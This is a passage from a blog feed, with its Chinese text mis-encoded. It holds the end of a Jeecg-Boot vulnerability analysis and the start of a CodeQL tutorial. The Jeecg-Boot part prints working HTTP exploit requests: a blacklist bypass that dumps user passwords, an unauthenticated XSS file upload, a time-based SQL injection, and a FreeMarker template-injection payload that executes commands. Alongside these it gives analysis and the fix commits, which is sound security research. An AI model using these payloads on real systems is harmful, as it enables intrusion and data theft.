class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>ç”±äº <code>AbstractQueryBlackListHandler</code> ç±»ä¸­çš„é»‘åå•æ ¡éªŒä¸ä¸¥æ ¼ï¼Œå¯¼è‡´å¤šä¸ªæ¥å£å¦‚ <code>sys/dict/queryTableData</code> å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ã€‚</p><h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=%60sys_user%60&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ•°æ®ä¹Ÿè¢«åŠ å¯†äº†ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„ç”¨å¤„ã€‚</p><h3 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>åœ¨ <code>isPass()</code>å‡½æ•°ä¸­ <code>ruleMap.get(name)</code> ä¸º null å³å¯ç»•è¿‡, å¯ä»¥é‡‡ç”¨ <code>sys_user</code>, <code>(sys_user)</code>, <code>sys_user%20</code> ç­‰ç»•è¿‡</p><h3 id="æ¼æ´ä¿®å¤-2"><a href="#æ¼æ´ä¿®å¤-2" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a">https://github.com/jeecgboot/jeecg-boot/commit/0fc374de4745eac52620eeb8caf6a7b76127529a<i class="fas fa-external-link-alt"></i></a></p><p>åŠ é»‘äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getTableName</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        String[] arr = str.split(<span class="string">&quot;\\s+(?i)where\\s+&quot;</span>);</span><br><span class="line">        <span class="comment">// sys_user , (sys_user), sys_user%20, %60sys_user%60  issues/4393</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">reg</span> <span class="operator">=</span> <span class="string">&quot;\\s+|\\(|\\)|`&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> arr[<span class="number">0</span>].replaceAll(reg, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œä¾æ—§å¯ä»¥ç”¨ &#96;&#96; bypass</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/dict/queryTableData?table=sys_user/**/&amp;pageSize=22&amp;pageNo=1&amp;text=username&amp;code=password</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3000</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxMTU4NzYsInVzZXJuYW1lIjoiYWRtaW4ifQ.sY0KYTR2WE4GPsdFzLtf_hQkOvPke5bkrfZBD-EekHk</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Jeecg-Boot-lt-x3D-3-5-1-å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#Jeecg-Boot-lt-x3D-3-5-1-å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="Jeecg-Boot &lt;&#x3D; 3.5.1 å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>Jeecg-Boot &lt;&#x3D; 3.5.1 å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><h3 id="æ¼æ´æè¿°-3"><a href="#æ¼æ´æè¿°-3" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>ç»æµ‹è¯•å‘ç° <code>/jeecg-boot/jmreport/upload</code>æ¥å£å­˜åœ¨æœªæˆæƒä»»æ„æ–‡ä»¶ä¸Šä¼ </p><h3 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æ–‡ä»¶ä¸Šä¼ </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>460</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryBB3U3apXylvyidXI</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/jeecg-boot/jmreport/index/864289498073407488?menuType=datainfo&amp;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;xss.html&quot;</span></span></span><br><span class="line"><span class="language-xquery">Content-Type: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    </span><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xquery"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;fileName&quot;</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">xss.html</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI</span></span><br><span class="line"><span class="language-xquery">Content-Disposition: form-data;<span class="built_in"> name</span>=<span class="string">&quot;biz&quot;</span></span></span><br><span class="line"><span class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">excel_online</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI--</span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ ä¸éœ€è¦ token éªŒè¯ï¼Œè®¿é—®éœ€è¦ token éªŒè¯ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/jimureport/xss1695174346254.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Microsoft Edge&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ çš„æ–‡ä»¶ç”šè‡³å¯ä»¥è®¿é—®</p><h3 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å¯¹åº”çš„ç±»å¤„ç† <code>org.jeecg.modules.jmreport.desreport.a.a</code> ç±»çš„ <code>upload</code> æ¥å£ã€‚æ‹¿åˆ° HTTP è¯·æ±‚å½“ä¸­æ–‡ä»¶ä¸Šä¼ è¯·æ±‚çš„å‚æ•°ï¼Œå¾€ä¸‹èµ°ï¼Œè¿›å…¥ <code>local</code></p><p>ä¸‹é¢å°±æ˜¯æ–‡ä»¶ä¸Šä¼ çš„éƒ¨åˆ†äº†ï¼Œå…¶å®å¹¶æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ã€‚åªæ˜¯æŠŠ <code>../</code> è¿‡æ»¤äº†</p><h3 id="æ¼æ´ä¿®å¤-3"><a href="#æ¼æ´ä¿®å¤-3" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p>æŠŠ jimuReport çš„ç‰ˆæœ¬å‡çº§åˆ° 1.6.1 +ï¼Œæœ€æ–°çš„ diff å¹¶æ²¡æœ‰æ‰¾åˆ°ï¼Œåç»­å€¼å¾—åˆ†æã€‚</p><h2 id="CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-æ³¨å…¥"><a href="#CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-æ³¨å…¥" class="headerlink" title="CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL æ³¨å…¥"></a>CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL æ³¨å…¥</h2><ul><li>ä¸å¾—ä¸æä¸€å˜´ï¼ŒSQL æ³¨å…¥çœŸçš„å¤ªå¤šäº†ã€‚</li></ul><h3 id="æ¼æ´æè¿°-4"><a href="#æ¼æ´æè¿°-4" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p><code>/sys/duplicate/check</code> æ¥å£ SQL æ³¨å…¥ï¼Œ<code>checksql</code> å¯ä»¥è¢«ç»•è¿‡ã€‚</p><h3 id="æ¼æ´å¤ç°-4"><a href="#æ¼æ´å¤ç°-4" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?tableName=v3_hello&amp;fieldName=1+and%09if(user(%20)=&#x27;root@localhost&#x27;,sleep(0),sleep(5))&amp;fieldVal=1&amp;dataId=asd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line">X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ†æ-4"><a href="#æ¼æ´åˆ†æ-4" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æœ¬è´¨ä¸Šæ¥è¯´ä¹Ÿæ˜¯é»‘åå•ç»•è¿‡</p><h3 id="æ¼æ´ä¿®å¤-4"><a href="#æ¼æ´ä¿®å¤-4" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b">https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b<i class="fas fa-external-link-alt"></i></a></p><p>SQL æ³¨å…¥åŸºæœ¬ä¸Šéƒ½æ˜¯åœ¨åšé»‘åå•çš„ bypassï¼Œåˆ†æ SQL æ³¨å…¥å°±åˆ†æåˆ°è¿™é‡Œã€‚</p><h2 id="CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-å­˜åœ¨-FreeMarker-æ¨¡æ¿å¼•æ“æ³¨å…¥"><a href="#CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-å­˜åœ¨-FreeMarker-æ¨¡æ¿å¼•æ“æ³¨å…¥" class="headerlink" title="CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 å­˜åœ¨ FreeMarker æ¨¡æ¿å¼•æ“æ³¨å…¥"></a>CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 å­˜åœ¨ FreeMarker æ¨¡æ¿å¼•æ“æ³¨å…¥</h2><h3 id="æ¼æ´æè¿°-5"><a href="#æ¼æ´æè¿°-5" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>JeecgBoot å—å½±å“ç‰ˆæœ¬ä¸­ç”±äºç§¯æœ¨æŠ¥è¡¨ <code>/jeecg-boot/jmreport/queryFieldBySql</code> Api æ¥å£æœªè¿›è¡Œèº«ä»½æ ¡éªŒï¼Œä½¿ç”¨ Freemarker å¤„ç†ç”¨æˆ·ç”¨æˆ·ä¼ å…¥çš„ sql å‚æ•°ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯å‘é€åŒ…å«æ¶æ„ sql å‚æ•°çš„ http è¯·æ±‚ï¼Œé€šè¿‡ SSTI åœ¨åº”ç”¨ç«¯æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="æ¼æ´å¤ç°-5"><a href="#æ¼æ´å¤ç°-5" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3100</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.20.10.2:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>103</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;sekect &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt;$&#123;ex(\&quot;calc\&quot;)&#125;&#x27;&quot;</span></span><br><span class="line"><span class="language-pgsql">&#125;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>postman å‘åŒ…</p><h3 id="æ¼æ´åˆ†æ-5"><a href="#æ¼æ´åˆ†æ-5" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å…¥å£å¯¹åº” <code>org.jeecg.modules.jmreport.desreport.a.a#c()</code> æ–¹æ³•ï¼Œå…ˆè¿‡äº† sql çš„é»‘åå•ï¼Œéšåè°ƒç”¨ <code>this.reportDbService.parseReportSql()</code> æ–¹æ³•ã€‚</p><p>è·Ÿè¿›å»æ˜¯è°ƒç”¨äº†åŠ¨æ€ä»£ç†ï¼Œä»£ç†äº† <code>target</code> å¯¹è±¡çš„ <code>method</code> æ–¹æ³•,å¹¶åœ¨æ‰§è¡Œè¯¥æ–¹æ³•æ—¶ä¼ å…¥ <code>argsToUse</code>å‚æ•°ï¼ŒåŠ¨è°ƒèƒ½å¤Ÿçœ‹åˆ°è°ƒç”¨çš„æ˜¯  <code>org.jeecg.modules.jmreport.desreport.service.a.i#parseReportSql</code> æ–¹æ³•ã€‚ä¸€è·¯è°ƒç”¨åæ¥åˆ° <code>org.jeecg.modules.jmreport.desreport.util.e#a</code> æ–¹æ³•ï¼›å…¶ä¸­è°ƒç”¨äº† <code>FreeMarkerUtils.a()</code></p><p>è·Ÿè¿›ä¹‹åå‘ç°ä»è¿™é‡Œå¼€å§‹æ–°å»ºäº†ä¸€ä¸ª Templateï¼Œå¹¶åŠ å·¥è¡¨è¾¾å¼ã€‚åé¢å°±æ˜¯ FreeMarker æ‰§è¡Œè¡¨è¾¾å¼çš„è¿‡ç¨‹äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p><h3 id="æ¼æ´ä¿®å¤-5"><a href="#æ¼æ´ä¿®å¤-5" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae">https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5">https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5<i class="fas fa-external-link-alt"></i></a></p><p>çœ‹ç€æ²¡å•¥é—®é¢˜ï¼Œæ˜¯å®Œæ•´çš„ä¿®å¤ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Jeecg-Boot éƒ¨åˆ†å†å²æ¼æ´åˆ†æ&lt;/p&gt;</summary>
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://drun1baby.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://drun1baby.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL å…¥é—¨</title>
    <link href="https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/"/>
    <id>https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/</id>
    <published>2023-09-03T13:30:21.000Z</published>
    <updated>2023-09-18T01:07:10.579Z</updated>
    
    <content type="html"><![CDATA[<p>CodeQL Â· çœŸå…¥é—¨</p><span id="more"></span><h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h2><p>åœ¨è‡ªå·±ç¬¬ä¸€éå­¦å®Œ CodeQL ä¹‹åè¿˜æ˜¯æ„Ÿè§‰æ¯”è¾ƒç”Ÿç–ï¼Œäºæ˜¯æƒ³æ‰¾ç‚¹é¶åœºç»ƒæ‰‹ï¼Œäºæ˜¯å°±æœ‰äº†è¿™ç¯‡æ–‡ç« ã€‚</p><h2 id="0x02-CodeQL-åŸºæœ¬è¯­æ³•"><a href="#0x02-CodeQL-åŸºæœ¬è¯­æ³•" class="headerlink" title="0x02 CodeQL åŸºæœ¬è¯­æ³•"></a>0x02 CodeQL åŸºæœ¬è¯­æ³•</h2><h3 id="QL-è¯­æ³•"><a href="#QL-è¯­æ³•" class="headerlink" title="QL è¯­æ³•"></a>QL è¯­æ³•</h3><p>ç”¨çš„æ˜¯è¿™ä¸ªé¶åœº â€”â€” <a class="link" href="https://github.com/l4yn3/micro_service_seclab/">micro_service_seclab:<i class="fas fa-external-link-alt"></i></a>ï¼ŒåŒç†å…¶å® JoyChou93 å¸ˆå‚…ä¹‹å‰æ‰€è®¾è®¡çš„é¶åœºï¼Œä¹Ÿæ˜¯å¯ä»¥ç”¨æ¥åš CodeQL ç»ƒä¹ çš„ã€‚</p><ul><li>æ·»åŠ å¯¹åº” database</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>CodeQLçš„æ ¸å¿ƒå¼•æ“æ˜¯ä¸å¼€æºçš„ï¼Œè¿™ä¸ªæ ¸å¿ƒå¼•æ“çš„ä½œç”¨ä¹‹ä¸€æ˜¯å¸®åŠ©æˆ‘ä»¬æŠŠmicro-service-seclabè½¬æ¢æˆCodeQLèƒ½è¯†åˆ«çš„ä¸­é—´å±‚æ•°æ®åº“ã€‚</p><p>ç„¶åæˆ‘ä»¬éœ€è¦ç¼–å†™QLæŸ¥è¯¢è¯­å¥æ¥è·å–æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/codeqlRunningProces.png" class><p>æ­£å¦‚è¿™å¼ å›¾æè¿°çš„ï¼Œç”±äºCodeQLå¼€æºäº†æ‰€æœ‰çš„è§„åˆ™å’Œè§„åˆ™åº“éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿåšçš„å°±æ˜¯ç¼–å†™ç¬¦åˆæˆ‘ä»¬ä¸šåŠ¡é€»è¾‘çš„QLè§„åˆ™ï¼Œç„¶åä½¿ç”¨CodeQLå¼•æ“å»è·‘æˆ‘ä»¬çš„è§„åˆ™ï¼Œå‘ç°é¶åœºçš„å®‰å…¨æ¼æ´ã€‚</p><p>æˆ‘ä»¬æ¥ç®€å•åœ°ä»‹ç»ä¸€ä¸‹æœ¬æ¡ˆä¾‹æ¶‰åŠåˆ°çš„CodeQLçš„åŸºæœ¬è¯­æ³•ã€‚</p><p>åŸºæœ¬è¯­æ³•åŒ…å«3ä¸ªéƒ¨åˆ†ã€‚</p><table class="editor-table-container"><thead><tr><th>åç§°</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>Method</td><td>æ–¹æ³•ç±»ï¼ŒMethod method è¡¨ç¤ºè·å–å½“å‰é¡¹ç›®ä¸­æ‰€æœ‰çš„æ–¹æ³•</td></tr><tr><td>MethodAccess</td><td>æ–¹æ³•è°ƒç”¨ç±»ï¼ŒMethodAccess call è¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­çš„æ‰€æœ‰æ–¹æ³•è°ƒç”¨</td></tr><tr><td>Parameter</td><td>å‚æ•°ç±»ï¼ŒParameter è¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­æ‰€æœ‰çš„å‚æ•°</td></tr></tbody></table><p>ç»“åˆ ql çš„è¯­æ³•ï¼Œæˆ‘ä»¬å°è¯•è·å– <code>micro-service-seclab</code> é¡¹ç›®å½“ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†é€šè¿‡ Method 